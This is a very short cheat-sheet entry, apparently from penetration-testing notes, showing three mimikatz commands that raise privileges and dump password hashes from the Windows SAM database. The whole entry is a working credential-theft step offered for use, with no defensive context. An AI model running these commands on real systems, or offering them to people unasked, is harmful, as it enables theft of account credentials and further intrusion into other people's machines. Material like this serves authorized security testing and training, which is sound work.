### mimikatz  

To dump password hashes from SAM database.  

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```
